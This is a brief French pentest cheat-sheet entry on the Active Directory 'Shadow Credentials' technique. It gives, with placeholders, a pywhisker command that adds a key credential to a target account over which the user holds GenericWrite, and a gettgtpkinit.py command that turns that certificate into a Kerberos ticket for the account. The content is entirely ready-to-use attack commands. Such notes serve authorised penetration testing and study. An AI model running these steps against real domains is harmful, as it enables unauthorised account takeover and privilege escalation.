# Shadow Credentials

Si un utilisateur possède l'ACL `GenericWrite` sur un objet :&#x20;

```
pywhisker -d <DOMAIN.LOCAL> -u <USER> -p <PASS> --target <USER-CIBLE> --action "add"

python3 gettgtpkinit.py -cert-pfx <FILE> -pfx-pass <PASS> <DOMAIN.LOCAL>/<USER-CIBLE> <OUTPUT.ccache>
```
